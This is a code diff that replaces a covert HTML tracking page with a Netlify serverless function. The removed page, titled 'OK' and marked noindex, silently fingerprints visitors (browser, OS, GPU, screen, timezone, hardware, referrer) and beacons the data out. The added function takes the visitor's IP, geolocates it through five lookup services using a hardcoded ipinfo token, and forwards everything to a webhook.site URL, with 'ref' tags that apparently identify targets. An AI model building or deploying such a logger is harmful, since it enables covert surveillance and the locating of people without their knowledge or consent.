@@ -1,130 +1,76 @@
-<!doctype html>
-<html lang="de">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>OK</title>
-  <meta name="robots" content="noindex,nofollow">
-</head>
-<body>
-<script>
-/** ====== Ziele ====== */
-const ENDPOINT_URL = "https://bespoke-marigold-09826a.netlify.app/.netlify/functions/collect"; // Netlify Function
-const DIRECT_WEBHOOK_URL = "https://webhook.site/fc10ea3b-4b75-4725-aa21-3856361748ca";         // dein webhook (nur für Test)
+export default async (request) => {
+  const WEBHOOK_URL   = "https://webhook.site/fc10ea3b-4b75-4725-aa21-3856361748ca";
+  const IPINFO_TOKEN  = "c243a3b2feab7f";
+  const GEO_TIMEOUT_MS = 4000;
 
-/** ====== Modus aus Query ====== */
-const q = new URLSearchParams(location.search);
-const REF = q.get("ref") || null;
-const DIRECT = q.has("direct"); // ?direct=1 → direkt an webhook + Dummy-Geo
-
-/** ====== Helpers ====== */
-function tzOffset(){
-  const m=new Date(), off=-m.getTimezoneOffset(), s=off>=0?"+":"-";
-  const h=String(Math.floor(Math.abs(off)/60)).padStart(2,"0");
-  const mn=String(Math.abs(off)%60).padStart(2,"0");
-  return `${s}${h}:${mn}`;
-}
-function detectOS(ua){
-  ua = (ua||"").toLowerCase();
-  if(/windows nt/.test(ua)) return "Windows";
-  if(/mac os x/.test(ua))  return "macOS";
-  if(/android/.test(ua))   return "Android";
-  if(/iphone|ipad|ipod|ios/.test(ua)) return "iOS/iPadOS";
-  if(/linux/.test(ua))     return "Linux";
-  return "Unbekannt";
-}
-
-/** ====== Extended Client-Daten ====== */
-function collectExtended(){
-  const nav = navigator;
-  // WebGL (GPU Infos)
-  let glInfo=null;
-  try{
-    const canvas=document.createElement("canvas");
-    const gl=canvas.getContext("webgl")||canvas.getContext("experimental-webgl");
-    if (gl){
-      const dbg=gl.getExtension("WEBGL_debug_renderer_info");
-      if (dbg){
-        glInfo={ vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) };
-      }
-    }
-  }catch(e){}
-
-  return {
-    ref: REF,
-    timestamp_iso: new Date().toISOString(),
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    tz_offset: tzOffset(),
-    language: nav.language,
-    languages: nav.languages,
-    doNotTrack: nav.doNotTrack || (window.doNotTrack ?? null),
-    cookiesEnabled: nav.cookieEnabled,
-    platform: nav.platform,
-    userAgent: nav.userAgent,
-    os: detectOS(nav.userAgent),
-    browser: (function(){
-      const ua=(nav.userAgent||"").toLowerCase();
-      if (ua.includes("edg/")) return "Edge";
-      if (ua.includes("chrome/") && !ua.includes("edg/") && !ua.includes("opr/")) return "Chrome";
-      if (ua.includes("safari/") && !ua.includes("chrome/")) return "Safari";
-      if (ua.includes("firefox/")) return "Firefox";
-      if (ua.includes("opr/")) return "Opera";
-      return "Unbekannt";
-    })(),
-    screen:{ w:screen.width, h:screen.height, pixelRatio:window.devicePixelRatio||1, colorDepth:screen.colorDepth },
-    viewport:{ w:window.innerWidth, h:window.innerHeight },
-    hardware:{ cores:navigator.hardwareConcurrency??null, ramGB:navigator.deviceMemory??null, maxTouch:navigator.maxTouchPoints??0 },
-    storage:{ local: !!window.localStorage, session: !!window.sessionStorage },
-    connection: navigator.connection ? { type:navigator.connection.effectiveType, downlink:navigator.connection.downlink } : null,
-    gl: glInfo,
-    local_time: new Date().toString(),
-    page:{ href: location.href, referrer: document.referrer }
+  const json = (status, data) => new Response(JSON.stringify(data), { status, headers: { "Content-Type": "application/json" } });
+  const withTimeout = (p, ms, label) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(`timeout@${label}`)), ms))]);
+  const fetchJSON = async (url, label) => {
+    const r = await withTimeout(fetch(url, { cache: "no-store" }), GEO_TIMEOUT_MS, label);
+    if (!r.ok) throw new Error(`HTTP ${r.status} @ ${label}`);
+    return r.json();
   };
-}
 
-/** ====== Senden (sendBeacon → fetch Fallback) ====== */
-async function send(url, payload){
-  try{
-    const blob = new Blob([JSON.stringify(payload)], {type:"text/plain;charset=UTF-8"});
-    const ok = navigator.sendBeacon(url, blob);
-    if (!ok){
-      await fetch(url, { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify(payload), keepalive:true });
-    }
-  }catch(e){ /* stumm */ }
-}
+  const H = request.headers;
+  const getClientIP = () =>
+    H.get("x-nf-client-connection-ip") ||
+    (H.get("x-forwarded-for") ? H.get("x-forwarded-for").split(",")[0].trim() : null) ||
+    H.get("x-real-ip") ||
+    H.get("client-ip") ||
+    H.get("cf-connecting-ip") ||
+    null;
 
-/** ====== Start ====== */
-document.addEventListener("DOMContentLoaded", async ()=>{
-  const base = collectExtended();
+  const geoLookup = async (ip) => {
+    const probes = [
+      (async () => { const g = await fetchJSON(ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/", "ipapi.co");
+        return { src:"ipapi.co", city:g.city, region:g.region, country:g.country_name, country_code:g.country, org:g.org, asn:g.asn, latitude:g.latitude, longitude:g.longitude, timezone:g.timezone }; })(),
+      (async () => { const g = await fetchJSON(`https://ipwho.is/${ip ?? ""}`, "ipwho.is");
+        if (g.success === false) throw new Error("ipwho.is failed");
+        return { src:"ipwho.is", city:g.city, region:g.region, country:g.country, country_code:g.country_code, org:g.connection?.org, asn:g.connection?.asn, latitude:g.latitude, longitude:g.longitude, timezone:g.timezone?.id }; })(),
+      (async () => { const g = await fetchJSON("https://get.geojs.io/v1/ip/geo.json", "geojs.io");
+        return { src:"geojs.io", city:g.city, region:g.region, country:g.country, country_code:g.country_code, org:g.organization, asn:g.asn, latitude:Number(g.latitude), longitude:Number(g.longitude), timezone:g.timezone }; })(),
+      (async () => { const g = await fetchJSON(`https://ip-api.com/json/${ip ?? ""}?fields=status,country,countryCode,regionName,city,lat,lon,isp,as,timezone`, "ip-api.com");
+        if (g.status !== "success") throw new Error("ip-api failed");
+        return { src:"ip-api.com", city:g.city, region:g.regionName, country:g.country, country_code:g.countryCode, org:g.isp, asn:g.as, latitude:g.lat, longitude:g.lon, timezone:g.timezone }; })(),
+      (async () => { const g = await fetchJSON(ip ? `https://ipinfo.io/${encodeURIComponent(ip)}/json?token=${encodeURIComponent(IPINFO_TOKEN)}` : `https://ipinfo.io/json?token=${encodeURIComponent(IPINFO_TOKEN)}`, "ipinfo.io");
+        const [lat, lon] = (g.loc || "").split(",").map(Number);
+        return { src:"ipinfo.io", city:g.city, region:g.region, country:g.country, country_code:g.country, org:g.org, asn:undefined, latitude:lat, longitude:lon, timezone:g.timezone }; })(),
+    ];
+    return Promise.any(probes);
+  };
 
-  if (DIRECT){
-    // Test/Direct-Mode: direkt an webhook + Dummy-Geo dazu, damit du die Struktur im webhook siehst
-    const testPayload = {
+  try {
+    let clientPayload = {};
+    if (request.method === "POST") { try { clientPayload = await request.json(); } catch {} }
+
+    const ip = getClientIP();
+    let ip_geolocation;
+    try { ip_geolocation = await geoLookup(ip); } catch (e) { ip_geolocation = { src:"none", note:String(e) }; }
+
+    const out = {
       received_at_iso: new Date().toISOString(),
-      request_ip: "203.0.113.42", // Dummy-IP (TESTNET)
-      user_agent: base.userAgent,
-      referrer: base.page.referrer || null,
-      client: base,
-      ip_geolocation: {
-        src: "dummy",
-        city: "Berlin",
-        region: "Berlin",
-        country: "DE",
-        country_code: "DE",
-        org: "Example ISP",
-        asn: 64500,
-        latitude: 52.52,
-        longitude: 13.405,
-        timezone: "Europe/Berlin"
-      },
-      runtime: { platform: "direct-test" }
+      request_ip: ip,
+      user_agent: H.get("user-agent") || null,
+      referrer: H.get("referer") || H.get("referrer") || null,
+      client: clientPayload || null,
+      ip_geolocation,
+      runtime: { platform: "netlify-functions", node: process.version },
     };
-    await send(DIRECT_WEBHOOK_URL, testPayload);
-  } else {
-    // Normal: an deine Netlify-Function (die reichert IP/Geo serverseitig an und leitet weiter)
-    await send(ENDPOINT_URL, base);
+
+    let forwarded = false, forwardStatus = null, forwardText = null;
+    try {
+      const r = await fetch(WEBHOOK_URL, { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify(out) });
+      forwardStatus = r.status;
+      forwarded = r.ok;
+      // Antworttext kurz mitschicken (zur Diagnose)
+      try { forwardText = await r.text(); } catch {}
+    } catch (e) {
+      forwardStatus = String(e);
+      forwarded = false;
+    }
+
+    return json(200, { ok:true, forwarded, forwardStatus, forwardText, ip_used: ip, geo_src: ip_geolocation?.src });
+  } catch (e) {
+    return json(500, { ok:false, error:String(e) });
   }
-});
-</script>
-</body>
-</html>
+};
